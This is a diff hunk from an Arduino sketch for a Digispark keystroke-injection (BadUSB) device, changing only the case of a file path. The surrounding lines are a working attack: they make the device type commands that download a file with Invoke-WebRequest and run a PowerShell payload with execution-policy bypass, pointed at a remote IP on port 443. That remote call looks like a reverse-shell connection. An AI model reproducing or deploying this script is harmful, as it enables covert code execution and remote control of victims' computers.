@@ -40,7 +40,7 @@ DigiKeyboard.println("Invoke-WebRequest -Uri $url -OutFile $output");
 DigiKeyboard.update();
 DigiKeyboard.delay(3*runspeed);
 //-windowstyle hidden
-DigiKeyboard.println("powershell.exe -executionpolicy bypass \"c:\\users\\$user\\desktop\\payload1.ps1 -dest 172.16.31.84 -port 443\""); //ip
+DigiKeyboard.println("powershell.exe -executionpolicy bypass \"c:\\Users\\$user\\Desktop\\payload1.ps1 -dest 172.16.31.84 -port 443\""); //ip
 }
 void loop() {
 //blink lights when script completes
